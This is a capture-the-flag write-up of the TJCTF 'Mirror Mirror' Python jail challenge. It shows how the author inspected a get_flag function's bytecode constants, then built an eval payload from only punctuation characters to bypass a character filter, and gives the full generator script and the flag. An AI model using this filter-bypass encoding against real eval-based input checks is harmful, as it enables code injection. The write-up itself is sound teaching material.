# Mirror Mirror

If you look closely, you can see a reflection.
```nc problem1.tjctf.org 8004```


## Intro + rant
When I saw some of the write-ups I got pretty bummed: I basically travelled from NY to Boston through Mumbai, that's how big of a detour I took. I solved the challenge after a few painstaking hours of probing and reading up, while driving back from holidays. Looking back, it could have taken no more than a couple of minutes. But oh well, hindsight is 20/20 /rant

## Getting started
I actually noticed the challenge after having spent a few hours looking at Abyss. By that point I knew that this was a classic PyJail escape task and I had a fairly good idea of what to try first. I quickly realized that the usual suspects ```eval```, ```exec```,```file``` etc. were not allowed. Using ```globals()``` I found the first clue: a ```get_flag()```function. So I followed the yellow bricked road.

## Analyzing the function
I was limited in what I could do but but gathered that the juicy info would be somewhere in ```func_code()```. Looking at ```get_flag.func_code().co_consts``` revealed the following values:

```(None, 'this_is_the_super_secret_string', 48, 57, 65, 90, 97, 122, 44, 95, ' is not a valid character', '%\xcb', "You didn't guess the value of my super_secret_string")```. 

Moreover, ```get_flag.func_code().co_varnames``` showed that there were only 4 variables throughout the function: 

```('input', 'super_secret_string', 'each', 'val')```.

Throwing some weird values at ```get_flag``` got me some error: 

```python
Traceback (most recent call last):                                                
  File "<console>", line 1, in <module>                                           
  File "/home/app/problem.py", line 23, in get_flag                               
    if(eval(input) == super_secret_string):                                       
  File "<string>", line 0                                                         

    ^                                                                             
SyntaxError: unexpected EOF while parsing
```

At this point I thought, well, this is easy: I simply need to send the secret string variable as an input and enjoy my flag. However, sending printable strings always returned a fake error: ```'c' is not a valid character```. I knew however that this meant that the flag wasn't being evaluated, since the constants clearly showed that there was a specific error for that. My pseudofunction looked like this:

```python
super_secret_string = 'this_is_the_super_secret_string'
def get_flag(input):
    if(eval(input) == super_secret_string):
        if (something):
            print eval(input)[0] + ' is not a valid character\n'
            return
        print "nice, here's your flag" + flag
    else:
        print "You didn't guess the value of my super_secret_string\n"
```

I started reading other write ups and went back to the function constants again. I noticed the '%\xcb' and tried to send that on a hunch as an argument for the flag. Aha! This time I got the "You dind't guess the value" error. This hinted at the fact that basica ascii is somehow blocked but python printable, non-standart characters are allowed. Basically I had to recreate the super secret string using pnly that.

## Solving

Poking around past ctfs, most used the basic classes exploit which requires '__' (not allowed here). Now armed with the additional knowledge that somehow this '%\xcb' had to be involed I found [this](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) incredibly useful ressource. I won't go into the details of the how and why but basically you can recreate whatever you want in python using simply ```[')', '}', '<', '(', '[', ':', ']', '{', '~']```.

From there it was easy. Using the function described in the write-up, which translates whatever ascii code into what can only be described as python brainfuck, I was able to craft a payload which evaluated to the string in question, send that and finally get the flag.

tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}

Full script:

```python
super_secret_string = 'this_is_the_super_secret_string'
def brainfuckize(nb):
    if nb in [-2, -1, 0, 1]:
        return ["~({}<[])", "~([]<[])",
                 "([]<[])",  "({}<[])"][nb+2]

    if nb % 2:
        return "~%s" % brainfuckize(~nb)
    else:
        return "(%s<<({}<[]))" % brainfuckize(nb/2)


def craftChar(n):
    beg = "`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%("
    end = ")"
    mid = brainfuckize(n)

    return beg+mid+end

tmp = ""
for i in super_secret_string:
    tmp+= craftChar(ord(i))
    tmp+='+'

tmp = tmp[:-1]
```
